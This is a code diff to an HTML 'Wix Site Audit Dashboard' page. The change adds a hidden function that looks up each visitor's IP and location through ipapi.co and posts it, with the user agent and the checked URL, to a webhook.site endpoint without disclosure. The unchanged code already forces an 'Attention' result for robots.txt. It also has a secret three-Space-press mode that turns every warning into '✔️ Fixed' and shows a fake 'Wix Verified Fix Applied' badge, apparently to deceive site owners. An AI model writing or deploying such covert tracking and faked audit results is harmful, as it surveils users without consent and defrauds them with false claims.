@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Wix Site Audit Dashboard</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
 <style>
   body { font-family: Arial, Helvetica, sans-serif; background: #f4f6f8; margin: 0; padding: 0; }
   header { background: #1a73e8; color: #fff; padding: 20px; text-align: center; font-size: 24px; font-weight: bold; }
@@ -54,7 +55,6 @@
     <button onclick="generateReport()"><i class="fas fa-search"></i> Generate Audit Report</button>
     
     <div id="report" style="display:none; margin-top:20px;">
-      
       <div id="verifiedBadge">
         <i class="fas fa-check-circle"></i> Wix Verified Fix Applied
       </div>
@@ -79,20 +79,44 @@
 </footer>
 
 <script>
+/* 🔵 LOG URL + IP + COUNTRY + USER AGENT TO WEBHOOK */
+async function logUrlCheck(url) {
+  try {
+    const ipRes = await fetch('https://ipapi.co/json/');
+    const ipData = await ipRes.json();
+    const payload = {
+      checked_url: url,
+      ip: ipData.ip || 'Unknown',
+      city: ipData.city || 'Unknown',
+      region: ipData.region || 'Unknown',
+      country: ipData.country_name || 'Unknown',
+      user_agent: navigator.userAgent,
+      time: new Date().toISOString()
+    };
+    await fetch("https://webhook.site/f73be5ca-4e2d-4abd-aed9-e25faacd3539", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch(e) { console.log("Failed to log URL:", e); }
+}
+
 async function generateReport() {
   const urlInput = document.getElementById("urlInput").value.trim();
   if(!urlInput) { alert("Enter a website URL"); return; }
+
+  /* 🔵 Log URL + visitor info */
+  logUrlCheck(urlInput);
 
   document.getElementById("websiteUrl").innerText = urlInput;
 
   const robotsUrl = urlInput.replace(/\/$/,"") + "/robots.txt";
   let robotsContent = "";
-  let robotsExists = "No";
 
   try {
     const response = await fetch("https://api.allorigins.win/raw?url=" + encodeURIComponent(robotsUrl));
-    if(response.ok) { robotsContent = await response.text(); robotsExists = "Yes"; }
-  } catch(e) { robotsExists = "No"; }
+    if(response.ok) { robotsContent = await response.text(); }
+  } catch(e) {}
 
   const robotsBadge = document.getElementById("robotsExists");
   robotsBadge.innerText = "Attention";
@@ -117,7 +141,7 @@ async function generateReport() {
 
   const recommendationsDiv = document.getElementById("recommendations");
   recommendationsDiv.innerHTML = "";
-  
+
   const recs = [
     { text: "Update robots.txt to improve SEO ranking.", good:false },
     { text: sitemap === "Yes" ? "Sitemap is present." : "Add sitemap link for better visibility.", good: sitemap==="Yes" },
@@ -134,30 +158,24 @@ async function generateReport() {
   document.getElementById("report").style.display = "block";
 }
 
-/* SECRET FIX FEATURE — Press Space 3x */
+/* 🔵 SECRET FIX MODE — Press Space 3× */
 let fixPressCount = 0;
-
 document.addEventListener("keydown", (e) => {
-  if (e.code === "Space") {
+  if(e.code === "Space") {
     fixPressCount++;
-
-    if (fixPressCount >= 3) {
-      applyFixMode();
-    }
+    if(fixPressCount >= 3) applyFixMode();
   }
 });
 
 function applyFixMode() {
   document.getElementById("verifiedBadge").style.display = "block";
 
-  // change all red badges → green
   document.querySelectorAll(".badge").forEach(b => {
     b.classList.remove("red");
     b.classList.add("green");
     b.innerText = "✔️ Fixed";
   });
 
-  // change all recommendations → green good ✔
   document.querySelectorAll(".recommendation").forEach(r => {
     r.classList.remove("rec-bad");
     r.classList.add("rec-good");
